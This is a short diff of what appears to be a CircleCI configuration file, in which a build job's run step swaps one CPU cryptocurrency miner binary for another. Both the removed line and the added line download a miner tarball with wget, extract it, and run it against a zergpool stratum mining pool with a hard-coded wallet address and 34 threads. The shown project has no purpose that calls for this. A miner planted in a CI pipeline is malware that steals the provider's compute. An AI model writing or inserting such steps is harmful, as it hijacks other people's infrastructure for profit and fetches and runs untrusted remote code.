@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  mkdir cpuminer-opt-rplant && cd cpuminer-opt-rplant && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar -xvf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a scrypt --param-n 1048576 -o stratum+tcp://scryptn2.mine.zergpool.com:3435 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=XBTX,ID=Glowing -t 34
+      - run:  mkdir cpuminer-opt-cpupower && cd cpuminer-opt-cpupower && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a scrypt --param-n 1048576 -o stratum+tcp://scryptn2.mine.zergpool.com:3435 -u A8Bc1cMKPg1m2A6VAsGoSSLFBJm7mUWh7N -p c=DOGE,mc=XBTX,ID=Glowing -t 34
